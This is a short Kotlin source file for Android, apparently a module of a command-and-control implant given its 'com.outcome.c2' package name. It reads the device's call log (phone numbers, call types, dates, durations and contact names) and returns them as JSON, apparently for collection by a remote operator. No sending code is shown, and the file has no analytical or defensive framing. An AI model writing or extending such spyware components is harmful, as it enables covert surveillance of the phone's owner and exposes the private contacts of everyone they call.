package com.outcome.c2

import android.content.Context
import android.provider.CallLog as ALog
import org.json.JSONArray
import org.json.JSONObject

object CallLog {

    fun list(ctx: Context, limit: Int): JSONObject {
        val arr = JSONArray()
        val cursor = ctx.contentResolver.query(
            ALog.Calls.CONTENT_URI,
            arrayOf(
                ALog.Calls.NUMBER,
                ALog.Calls.TYPE,
                ALog.Calls.DATE,
                ALog.Calls.DURATION,
                ALog.Calls.CACHED_NAME
            ),
            null, null,
            ALog.Calls.DATE + " DESC LIMIT $limit"
        )
        cursor?.use {
            while (it.moveToNext()) {
                arr.put(JSONObject().apply {
                    put("number", it.getString(0) ?: "")
                    put("type", it.getInt(1))
                    put("date", it.getLong(2))
                    put("duration", it.getLong(3))
                    put("name", it.getString(4) ?: "")
                })
            }
        }
        return JSONObject().put("count", arr.length()).put("calls", arr)
    }
}
